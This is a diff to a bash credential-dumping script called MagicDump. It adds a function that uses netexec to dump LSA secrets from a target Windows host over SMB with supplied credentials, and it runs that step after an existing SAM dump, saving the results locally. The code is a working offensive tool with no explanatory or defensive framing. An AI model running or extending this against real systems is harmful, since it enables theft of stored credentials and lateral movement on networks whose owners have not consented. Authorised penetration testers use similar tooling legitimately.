@@ -158,12 +158,31 @@ dump_sam() {
   fi
 }
 
+# Function to execute LSA dump
+dump_lsa() {
+  local output_file="$DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
+  add_log "Starting LSA dump using netexec..."
+  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' --lsa > '$output_file' 2>/dev/null"
+  if run_command "$cmd"; then
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump completed successfully. Output saved to $output_file"
+    log_operation "LSA" "success" "\"file_path\": \"$output_file\""
+    add_log "LSA dump saved to $output_file"
+  else
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump failed. Check permissions or connectivity."
+    log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
+    add_warning "Failed to dump LSA on target $TARGET_HOST"
+  fi
+}
+
 # Main script logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
 
 # Execute SAM dump
 dump_sam
+
+# Execute LSA dump
+dump_lsa
 
 # Display summary to user (without JSON dump)
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
